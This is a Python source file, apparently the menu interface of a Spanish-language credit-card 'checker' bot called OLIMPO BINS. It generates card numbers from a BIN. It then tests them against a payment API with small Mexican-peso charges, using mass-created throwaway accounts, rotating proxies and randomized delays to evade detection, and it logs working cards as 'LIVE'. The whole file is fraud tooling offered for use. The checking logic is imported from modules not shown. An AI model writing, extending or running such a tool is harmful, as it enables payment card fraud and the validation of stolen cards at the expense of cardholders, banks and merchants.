import os
import time
import random
import sys
from rich.console import Console
from rich.text import Text
from rich.panel import Panel
from rich.align import Align
from rich.table import Table

from gen import cc_gen, cargar_bin_db, buscar_bin
from main import (
    cargar_proxies, cargar_tokens, cargar_combo,
    guardar_combo, guardar_live, guardar_dead,
    check_card, format_proxy, log_to_file,
    registrar_cuenta, crear_cuentas_para_check,
    MONTOS, TARJETAS_POR_CUENTA,
    API_NO_DISPONIBLE, TOKENS_FILE,
)

console = Console()

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def banner():
    t = Text(justify="center")
    t.append("\n")
    t.append("█▀█ █   █ █▀▄▀█ █▀█ █▀█   █▄▄ █ █▄ █ █▀\n", style="bold red")
    t.append("█▄█ █▄▄ █ █ ▀ █ █▀▀ █▄█   █▄█ █ █ ▀█ ▄█\n", style="bold red")
    t.append("\n")
    t.append("      OLIMPO BINS\n", style="bold red")
    t.append("        BOT DEV BY @MrMxyzptlk04\n", style="dim red")
    return Panel(Align.center(t), border_style="red", padding=(1, 4))

def menu_generar():
    clear()
    console.print(banner())
    console.print("\n  [bold red]GENERAR COMBOS[/bold red]")

    bin_input = input("  Primeros 8-12 digitos del BIN: ").strip()
    if not bin_input.isdigit() or len(bin_input) < 8:
        console.print("  [red]Minimo 8 digitos[/red]")
        input("\n  [Enter para volver]")
        return

    mes = input("  Mes de expiracion (MM): ").strip()
    try:
        if int(mes) < 1 or int(mes) > 12:
            raise ValueError
    except:
        console.print("  [red]Mes invalido[/red]")
        input("\n  [Enter para volver]")
        return
    mes = mes.zfill(2)

    ano = input("  Año de expiracion (YY o YYYY): ").strip()
    if len(ano) == 2:
        ano = "20" + ano
    if not ano.isdigit() or len(ano) != 4:
        console.print("  [red]Año invalido[/red]")
        input("\n  [Enter para volver]")
        return

    try:
        cantidad = int(input("  Cantidad (1-500): ").strip())
        if cantidad < 1 or cantidad > 500:
            raise ValueError
    except:
        console.print("  [red]Cantidad invalida (1-500)[/red]")
        input("\n  [Enter para volver]")
        return

    console.print(f"\n  [dim]Generando {cantidad} tarjetas...[/dim]")
    ccs = cc_gen(bin_input, mes, ano, cantidad)
    guardar_combo(ccs)

    console.print(f"\n  [green]{len(ccs)} tarjetas generadas y guardadas en combo.txt[/green]")
    input("\n  [Enter para volver]")

def menu_iniciar():
    clear()
    console.print(banner())

    if not os.path.exists("combo.txt") or os.path.getsize("combo.txt") == 0:
        console.print("\n  [red]combo.txt no existe o esta vacio[/red]")
        console.print("  [dim]Usa la opcion 1 para generar tarjetas[/dim]")
        input("\n  [Enter para volver]")
        return

    combos = cargar_combo()
    total_tarjetas = len(combos)

    console.print("\n  [bold red]Elige el monto del cargo:[/bold red]")
    opciones = [
        ("1", "$1 MXN CARGO"),
        ("2", "$20 MXN ABONO"),
        ("3", "$50 MXN ABONO"),
        ("4", "$100 MXN ABONO"),
    ]
    for clave, texto in opciones:
        t = Text()
        t.append("  ", style="white")
        t.append(f"[{clave}]", style="bold red")
        t.append(" ", style="white")
        t.append(texto, style="red")
        console.print(t)

    op = input("\n  Monto: ").strip()

    if op not in MONTOS:
        console.print("  [red]Opcion invalida[/red]")
        input("\n  [Enter para volver]")
        return

    monto, monto_label = MONTOS[op]
    monto_nombre = f"${int(monto)} MXN CARGO" if monto == 1.0 else f"${int(monto)} MXN ABONO"
    tarjetas_por_cuenta = TARJETAS_POR_CUENTA[op]

    proxies_list = cargar_proxies()
    bin_db = cargar_bin_db()

    cuentas_necesarias = (total_tarjetas + tarjetas_por_cuenta - 1) // tarjetas_por_cuenta
    console.print(f"\n  [dim]Total tarjetas: {total_tarjetas}")
    console.print(f"  [dim]Tarjetas por cuenta: {tarjetas_por_cuenta}")
    console.print(f"  [dim]Cuentas necesarias: {cuentas_necesarias}")
    console.print(f"  [dim]Proxies disponibles: {len(proxies_list)}[/dim]\n")

    if os.path.exists(TOKENS_FILE):
        os.remove(TOKENS_FILE)

    log_to_file(f"INICIANDO CHECK - {monto_nombre}")
    log_to_file(f"Tarjetas: {total_tarjetas} | Tarjetas/cuenta: {tarjetas_por_cuenta}")

    # Generar cuentas en segundo plano sin mostrar pantalla
    tokens_generados = crear_cuentas_para_check(cuentas_necesarias, proxies_list)
    
    if tokens_generados == 0:
        console.print("  [red]No se generaron tokens. Abortando.[/red]")
        input("\n  [Enter para volver]")
        return

    tokens = cargar_tokens()
    if len(tokens) < cuentas_necesarias:
        console.print(f"  [yellow]Advertencia: {len(tokens)} tokens generados de {cuentas_necesarias} necesarios[/yellow]")

    lives_total = 0
    deads_total = 0
    errores_total = 0
    cuentas_usadas = 0
    api_no_disponible = False

    clear()
    console.print(banner())
    console.print(f"\n  [bold red]INICIANDO CHECK — {monto_nombre}[/bold red]")
    console.print(f"  [dim]Tarjetas: {total_tarjetas} | Tarjetas/cuenta: {tarjetas_por_cuenta}[/dim]\n")

    i = 0
    token_idx = 0
    token_actual = None
    proxy_actual = None
    tarjetas_en_cuenta = 0

    while i < total_tarjetas and not api_no_disponible:
        if tarjetas_en_cuenta >= tarjetas_por_cuenta or token_actual is None:
            if token_idx >= len(tokens):
                console.print("  [red]No hay mas tokens disponibles[/red]")
                break
            token_actual = tokens[token_idx]
            token_idx += 1
            proxy_actual = format_proxy(random.choice(proxies_list)) if proxies_list else None
            cuentas_usadas += 1
            tarjetas_en_cuenta = 0

        combo = combos[i]
        if not combo or "|" not in combo:
            i += 1
            continue
        parts = combo.strip().split("|")
        if len(parts) < 4:
            i += 1
            continue

        cc, mes, ano, cvv = parts[0], parts[1], parts[2], parts[3]
        bin_info = buscar_bin(cc, bin_db)
        brand = bin_info.get("brand", "?")
        banco = bin_info.get("Banco", "?")

        t_num = Text()
        t_num.append(f"  [{i+1}/{total_tarjetas}] ", style="white")
        t_num.append(f"{cc[:6]}...{cc[-4:]}", style="white")
        t_num.append(" | ", style="dim")
        t_num.append(f"{brand} - {banco}", style="dim")
        console.print(t_num)

        tipo, display, detalle = check_card(cc, mes, ano, cvv, monto, monto_nombre, token_actual, proxy_actual, bin_info)

        if tipo == "error" and ("API APAGADA" in detalle or "API NO DISPONIBLE" in detalle):
            console.print(f"    [bold red]{detalle}[/bold red]")
            api_no_disponible = True
            break

        if tipo == "live":
            lives_total += 1
            guardar_live(combo, monto_nombre, bin_info)
            console.print(f"    [bold green]LIVE | {detalle}[/bold green]")
            console.print(f"  [green]CCS: {combo}[/green]")
            console.print(f"  [green]Status: LIVE[/green]")
            console.print(f"  [green]Response: {detalle}[/green]")
            console.print(f"  [green]Resultado: APROBADA[/green]")
            console.print(f"  [dim]{brand} | {banco}[/dim]\n")
        elif tipo == "dead":
            deads_total += 1
            guardar_dead(combo, detalle, bin_info)
            if "HTTP" in detalle or "Fondos" not in detalle:
                console.print(f"    [bold red]DEAD[/bold red]")
            else:
                console.print(f"    [bold red]DEAD | {detalle}[/bold red]")
        else:
            errores_total += 1
            console.print(f"    [bold red]ERROR | {detalle}[/bold red]")

        tarjetas_en_cuenta += 1
        i += 1

        if i < total_tarjetas:
            time.sleep(random.uniform(0.8, 1.5))

    if api_no_disponible or API_NO_DISPONIBLE:
        console.print("\n  [bold red]╔══════════════════════════════════════════════════════════════════╗[/bold red]")
        console.print("  [bold red]║  API NO DISPONIBLE                                              ║[/bold red]")
        console.print("  [bold red]║                                                                  ║[/bold red]")
        console.print("  [bold red]║  HORARIO DE 8 AM A 8 PM APROXIMADAMENTE.                        ║[/bold red]")
        console.print("  [bold red]║  LUNES A VIERNES. FINES DE SEMANA REVISAR DISPONIBILIDAD.       ║[/bold red]")
        console.print("  [bold red]╚══════════════════════════════════════════════════════════════════╝[/bold red]")
        input("\n  [Enter para volver]")
        return

    console.print(f"\n  [bold green]FINALIZADO[/bold green]")
    console.print(f"  [green]Lives: {lives_total}[/green]")
    console.print(f"  [red]Deads: {deads_total}[/red]")
    console.print(f"  [red]Errores: {errores_total}[/red]")
    console.print(f"  [dim]Cuentas usadas: {cuentas_usadas}[/dim]")
    log_to_file(f"FINALIZADO - Lives: {lives_total} | Deads: {deads_total} | Errores: {errores_total}")
    input("\n  [Enter para volver]")

def menu_bin():
    clear()
    console.print(banner())
    console.print("\n  [bold red]CONSULTAR BIN[/bold red]")
    bin_input = input("\n  Ingresa los primeros 6-8 digitos: ").strip()
    if not bin_input.isdigit():
        console.print("  [red]BIN invalido[/red]")
        input("\n  [Enter para volver]")
        return

    bin_db = cargar_bin_db()
    info = buscar_bin(bin_input, bin_db)

    if info:
        table = Table(title=f"BIN: {bin_input}")
        for k, v in info.items():
            table.add_row(k, v)
        console.print(table)
    else:
        console.print(f"  [red]BIN {bin_input} no encontrado[/red]")
    input("\n  [Enter para volver]")

def main():
    while True:
        clear()
        console.print(banner())
        opciones = [
            ("1", "Generar combo"),
            ("2", "Iniciar Check"),
            ("3", "Revisar BIN"),
            ("4", "Salir"),
        ]
        for clave, texto in opciones:
            t = Text()
            t.append("  ", style="white")
            t.append(f"[{clave}]", style="bold red")
            t.append(" ", style="white")
            t.append(texto, style="red")
            console.print(t)

        op = input("\n  Opcion: ").strip()

        if op == "1":
            menu_generar()
        elif op == "2":
            menu_iniciar()
        elif op == "3":
            menu_bin()
        elif op == "4":
            clear()
            console.print(banner())
            console.print("\n  [bold red]Programa finalizado, hasta nunca bastardo[/bold red]")
            console.print("  [dim]BOT DEV BY @MrMxyzptlk04[/dim]")
            break
        else:
            console.print("\n  [red]Opcion invalida[/red]")
            time.sleep(1)

if __name__ == "__main__":
    main()